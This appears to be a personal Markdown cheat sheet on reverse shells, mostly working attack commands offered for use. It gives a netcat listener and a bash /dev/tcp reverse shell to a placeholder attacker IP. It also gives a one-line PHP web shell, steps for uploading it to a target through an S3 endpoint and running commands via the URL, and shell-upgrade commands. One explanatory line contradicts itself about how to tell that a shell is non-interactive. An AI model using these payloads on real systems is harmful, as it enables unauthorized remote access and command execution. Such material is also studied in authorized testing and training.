# Description
This file lists everything I know about reverse shells and how to use them.

# Create a reverse shell
#### Description
How to create a reverse shell through bash/Linux terminal commands
### What are reverse shells used for?
Reverse shells are often used for gaining remote access to a system. Reverse shells require a listener on your attacking machine, and then you need to execute a command on the target machine that connects back to your listener, granting you access to the target machine's shell.
### How to create a reverse shell using ```bash```
1. ```nc -lvnp 4444```: use ```netcat``` to create a listener on port ```4444```
    a. Other port numbers can be used as well, select the number that works for you 
2. ```bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1```: use ```bash``` to start an interactive shell
### How to create a reverse shell using ```aws``` and ```php```
1. ```nano shell.php```
    a. Use the code editor to write a piece of code in PHP, such as:
   ```<? php system($_GET['cmd']); ?>```
2. ```cat shell.php```: check for ```shell.php```
3. ```aws s3 cp --endpoint-url=http://<target_url> shell.php s3://<target_url_w/o_extensions>```: upload ```shell.php``` to target
4. go to web browser, enter URL ```http://<target_url>/shell.php?cmd=ls```: execute ```ls``` command in web browser
    a. You should now have access to the target website and can execute ```bash``` commands through the URL.
    b. Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.


# Upgrade your shell
#### Description
How to upgrade a non-interactive shell (reverse shell) to a fully interactive one
### How do I know if I'm in a non-interactive shell?
You're probably in an interactive shell if you've tried to execute a MySQL prompt and the program froze.
### How to upgrade your shell
1. ```python3 -c 'import pty; pty.spawn("/bin/bash")'```
2. ```stty raw -echo; fg```
3. ```script /dev/null -c bash```
